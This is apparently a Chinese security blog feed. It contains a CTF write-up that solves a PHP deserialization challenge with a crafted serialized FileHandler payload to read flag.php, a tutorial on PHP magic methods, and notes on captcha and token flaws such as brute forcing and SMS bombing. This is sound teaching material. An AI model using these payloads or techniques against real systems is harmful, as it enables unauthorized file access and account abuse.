double-quoted-string">"2"</span><span class="token punctuation">)</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>先进行代码审计</p><p>涉及函数：<br><code>ord()</code> 函数返回字符串中第一个字符的 ASCII 值；</p><p><code>file_get_contents()</code> 函数把整个文件读入一个字符串中。</p><p>分块代码分析：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token comment">//接收字符串使其执行__destruct()函数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>function is_valid()</code>函数：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/*is_valid()是一层防护,检查传入的str的每个字母的ascii值在32和125之间;是因为protected在序列化之后会出现不可见字符\00*\100,不符合要求，这里绕过方法就是直接改成public，原因是php7.1以上的版本对属性类型不敏感类型。而public属性序列化不会出现不可见字符*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>function __destruct()</code>函数：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">/*destruct()魔术方法会在传参是2的字符的时候，对传入的参数进行赋值，再执行process()函数；这里还需要注意一下op==="2"是强类型比较，而process()中op=="2"是弱类型比较，强类型比较既比较类型也比较值；而弱类型比较只比较值不比较类型。*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>function process()</code>函数：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//传入op=="2"使其执行read()函数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为了绕过<code>__destruct()</code>函数中<code>op</code>的强类型比较，可以使<code>op=2</code>，使强类型返回<code>false</code>，使<code>process()</code>中的弱类型返回<code>true</code>。</p><p>整体代码分析：</p><p>代码中包含一个<code>flag.php</code>文件，有一个<code>FileHandler</code>的类，创建了三个变量，<code>$op，$filename</code>和<code>$content</code>；如果以<code>GET</code>方式使用<code>str</code>接收一个参数，将接收到的<code>str</code>值强制转换为<code>string</code>类型；使用<code>is_valid()</code>函数进行检查，执行<code>for</code>循环，若接收到的每一个字符的<code>ASCII</code>值<code>&gt;=32&amp;&amp;&lt;=125</code>则返回<code>true</code>；之后执行 <code>$obj = unserialize($str);</code>，此时整个程序已经结束，便会执行<code>function __destruct()</code>，若<code>op===&quot;2&quot;</code>则会执行<code>op = &quot;1&quot;</code>，当执行到<code>$this-&gt;process();</code>是便会执行<code>function process()</code>中的<code>if($this-&gt;op == &quot;1&quot;) &#123;$this-&gt;write();&#125;</code>，之后便会执行<code>function write()</code>，执行到这里并没有什么用，得不到flag；因此<code>op==2</code>使其执行<code>function read()</code>，此时只要将<code>flag.php</code>文件赋值给<code>filename</code>即可输出<code>flag</code>的值。</p><p>其实就需要：传入一个序列化之后的类对象。</p><h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>编写PHP脚本：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">public</span>  <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">;</span>        <span class="token comment">//因为destruct函数会将content改为空，所以content的值随意（但是要满足is_valid()函数的要求）</span><span class="token punctuation">&#125;</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>/*将op=2；filename="flag.php";content任意值满足is_valid()即可；之后使用new将FileHandler()类实例化为对象，再使其序列化输出即可。new：实例化对象；将类实例化成对象非常容易，只需要使用new关键字并在后面加上一个和类名同名的方法即可。当然如果在实例化对象时不需要为对象传递参数，在new关键字后面直接用类名称即可，不需要再加上括号。*/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到反序列化值：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"FileHandler"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"op"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"filename"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"content"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"2"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参考文章：<a href="https://blog.csdn.net/xhy18634297976/article/details/122737825">https://blog.csdn.net/xhy18634297976/article/details/122737825</a></p><h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>传参</p><p><img src="/2022/06/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/image-20220604224246443.png" alt="image-20220604224246443"></p><p>查看源代码得到flag</p><p><img src="/2022/06/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/image-20220604224312500.png" alt="image-20220604224312500"></p><h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>一道网鼎杯PHP反序列化题目，最重要的使代码审计，尤其还要注意<code>protected</code>在序列化之后会出现不可见字符，需要修改为<code>public</code>；像这样有类的反序列化需要将类实例化再序列化输出。</p><p>如图：当使用<code>protected</code>时出现了不可见字符。</p><p><img src="/2022/06/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/image-20220604224956407.png" alt="image-20220604224956407"></p>]]></content>
      
      
      <categories>
          
          <category> 反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化-PHP</title>
      <link href="/2022/06/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-PHP/"/>
      <url>/2022/06/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-PHP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图</p><p><img src="/2022/06/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-PHP/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png" alt="PHP反序列化"></p><h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><p>序列化：将对象转化为字节序列</p><p>反序列化：将字节序列转化为对象</p><p><img src="/2022/06/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-PHP/image-20220604102214070.png" alt="image-20220604102214070"></p><h2 id="0x02-PHP反序列化"><a href="#0x02-PHP反序列化" class="headerlink" title="0x02 PHP反序列化"></a>0x02 PHP反序列化</h2><p>未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL 注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。</p><p>PHP序列化与反序列化函数：</p><p><code>serialize()</code>     &#x2F;&#x2F;将一个对象转换成一个字符串</p><p><code>unserialize()</code>   &#x2F;&#x2F;将字符串还原成一个对象</p><h2 id="0x03-触发漏洞"><a href="#0x03-触发漏洞" class="headerlink" title="0x03 触发漏洞"></a>0x03 触发漏洞</h2><p>触发：unserialize 函数的变量可控，文件中存在可利用的类，类中有魔术方法：</p><pre class="line-numbers language-none"><code class="language-none">__construct()&#x2F;&#x2F;创建对象时触发__destruct() &#x2F;&#x2F;对象被销毁时触发__call() &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发__callStatic() &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发__get() &#x2F;&#x2F;用于从不可访问的属性读取数据__set() &#x2F;&#x2F;用于将数据写入不可访问的属性__isset() &#x2F;&#x2F;在不可访问的属性上调用 isset()或 empty()触发__unset() &#x2F;&#x2F;在不可访问的属性上使用 unset()时触发__invoke() &#x2F;&#x2F;当脚本尝试将对象调用为函数时触发<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考：<a href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a></p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>反序列化格式：将对象转化为字符串后的各属性图解</p><p><img src="/2022/06/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-PHP/image-20220604105725888.png" alt="image-20220604105725888"></p><h2 id="0x05-PHP反序列化-无类问题-本地"><a href="#0x05-PHP反序列化-无类问题-本地" class="headerlink" title="0x05 PHP反序列化-无类问题-本地"></a>0x05 PHP反序列化-无类问题-本地</h2><h3 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h3><p>写一个php序列化的脚本测试</p><p>代码如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$KEY</span><span class="token operator">=</span><span class="token string single-quoted-string">'muyu123'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$KEY</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>利用<a href="https://www.dooccn.com/php/%E5%9C%A8%E7%BA%BF%E5%B9%B3%E5%8F%B0%E8%BE%93%E5%87%BA%E5%85%B6%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%90%8E%E7%9A%84%E5%86%85%E5%AE%B9">https://www.dooccn.com/php/在线平台输出其序列化之后的内容</a></p><p><img src="/2022/06/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-PHP/image-20220604110520882.png" alt="image-20220604110520882"></p><p>可以看到输出序列化为：s字符型，长度为7个字符，变量名为muyu123。</p><p>这个例子由于没有<code>class</code>，由此是无类的情况。</p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>相反，进行反序列化输出，修改代码为：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$KEY</span><span class="token operator">=</span><span class="token string single-quoted-string">'s:7:"muyu123";'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$KEY</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果</p><p><img src="/2022/06/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-PHP/image-20220604111006687.png" alt="image-20220604111006687"></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>对这部分代码块进行代码审计：</p><p>包含一个flag.php文件，有一个KEY，以GET方式接收一个字符串，若接受的字符串反序列化之后&#x3D;KEY值，则输出flag.php文件。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token variable">$KEY</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"muyu123"</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$KEY</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h3><p>当KEY值不是字符串的时候，不会显示长度。</p><p><img src="/2022/06/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-PHP/image-20220604113325085.png" alt="image-20220604113325085"></p><h2 id="0x06-PHP反序列化有类问题"><a href="#0x06-PHP反序列化有类问题" class="headerlink" title="0x06 PHP反序列化有类问题"></a>0x06 PHP反序列化有类问题</h2><p>有类（class）代码代码块</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ABC</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'调用了构造函数&lt;br>'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'调用了析构函数&lt;br>'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'调用了苏醒函数&lt;br>'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'创建对象a&lt;br>'</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ABC</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'序列化&lt;br>'</span><span class="token punctuation">;</span><span class="token variable">$a_ser</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'反序列化&lt;br>'</span><span class="token punctuation">;</span><span class="token variable">$a_unser</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a_ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'对象快要死了！'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行结果为：（只要有过Java和C++的功底都能理解）</p><p><img src="/2022/06/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-PHP/image-20220604185514622.png" alt="image-20220604185514622"></p><p><img src="/2022/06/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-PHP/image-20220604195104646.png" alt="image-20220604195104646"></p>]]></content>
      
      
      <categories>
          
          <category> 反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑越权-验证码与Token及接口</title>
      <link href="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/"/>
      <url>/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220602162201155.png" alt="image-20220602162201155"></p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p><strong>1、验证码安全</strong></p><p>分类: 图片，手机或邮箱，语音，视频，操作等<br>原理: 验证生成或验证过程中的逻辑问题<br>危害: 账户权限泄漏，短信轰炸，遍历，任意用户操作等<br>漏洞: 客户端回显，验证码复用，验证码爆破，绕过等<br>—验证码爆破：没有次数限制，验证码有效时间内不变</p><p>—验证码识别：用工具识别验证码</p><p>—复用：用上一次的验证码来绕过下一次的验证</p><p>—回显：验证码在前端数据包显示</p><p><strong>2、token 安全</strong></p><p>Token的定义<br>Token是服务端生成的一串字符串。当客户端第一次登录后，服务器生成一个Token并将此Token返回给客户端，Token可以代替用户名和密码作为身份的验证。</p><p>每次客户端与服务器端通信，会得到新的Token<br>基本上述同理，主要是验证中可存在绕过可继续后续测试<br>token 爆破，token 客户端回显等<br>—token 爆破—token后面会跟上一个字符串，如果知道规律可以进行爆破</p><p>—token 客户端回显—token的数据会在前端数据包（request）里面显示</p><p>—token固定—虽然有token，但是可以通过上一次的token操作下一次的数据包（表面上有，实际没有）</p><p><strong>3、验证码识别插件工具使用</strong></p><p>captcha-killer<br>Pkav_Http_Fuzz<br>reCAPTCHA 等</p><p><strong>4、接口安全问题</strong></p><p>调用，遍历，未授权，篡改等<br>调用案例：短信轰炸<br>遍历案列：UID 等遍历<br>callback 回调 JSONP（使用callback相当于回调，需要取数据，可能会符合一些漏洞的条件，形成安全问题）</p><h2 id="0x02-Token"><a href="#0x02-Token" class="headerlink" title="0x02 Token"></a>0x02 